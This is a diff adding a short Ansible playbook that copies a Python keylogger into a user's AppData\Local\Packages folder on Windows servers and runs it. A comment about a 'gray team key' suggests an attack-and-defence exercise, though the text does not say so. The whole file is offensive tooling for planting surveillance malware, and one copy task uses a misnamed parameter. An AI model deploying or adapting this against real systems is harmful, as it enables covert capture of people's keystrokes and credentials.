@@ -1,0 +1,21 @@
+---
+- name: Deploy and run keylogger on Windows Server
+  hosts: Windows
+
+  vars:
+    source_path: ./keylogger.py
+    dest_path: C:\Users\applejack\AppData\Local\Packages\keylogger.py # destination folder is the same folder that the log file gets placed in
+  
+  tasks:
+
+    # check gray team key
+
+    # copy script
+    - name: Copy Python script to Windows Servers
+      win_copy:
+        src: "{{ source_path }}"
+        dest_path: "{{ dest_path }}"
+
+    # run script
+    - name: Run Python script on Windows Servers
+      win_command: "python {{ dest_path }}"
